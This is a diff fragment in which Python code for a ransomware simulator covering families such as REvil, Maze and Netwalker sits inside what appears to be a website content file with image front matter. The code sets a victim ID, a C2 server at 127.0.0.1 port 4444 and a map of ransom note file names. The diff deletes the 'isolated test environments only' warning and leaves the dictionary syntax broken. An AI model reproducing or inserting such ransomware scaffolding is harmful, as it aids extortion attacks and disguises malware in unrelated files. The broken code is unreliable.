@@ -38,7 +38,6 @@ ogImage: './images/pro-accountant/accnt.webp'
 #           para evaluación de infraestructura.
 #           Incluye: DoppelPaymer, Maze, REvil, Nemty, Netwalker,
 #                    Pysa, Nefilim, Ragnarlocker, Sekhmet, Snatch.
-# ADVERTENCIA: SOLO PARA ENTORNOS DE PRUEBA AISLADOS.
 # ======================================================
 
 import os
@@ -55,7 +54,6 @@ import base64
 from pathlib import Path
 from datetime import datetime
 
-# --- 1. CONFIGURACIÓN INICIAL ---
 VICTIM_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
 C2_SERVER = "127.0.0.1"
 C2_PORT = 4444
@@ -87,10 +85,7 @@ RANSOM_NOTES = {
     "Nefilim": "nefilim_readme.txt",
     "Ragnarlocker": "ragnar_readme.txt",
     "Sekhmet": "sekhmet_readme.txt",
-    "Snatch": "snatch_readme.txt"
-}
-
-# --- 2. FUNCIONES DE DETECCIÓN DE SISTEMA ---
+    "Snatch": "snatch_readme.txt
 
 def is_admin():
     if platform.system() == "Windows":
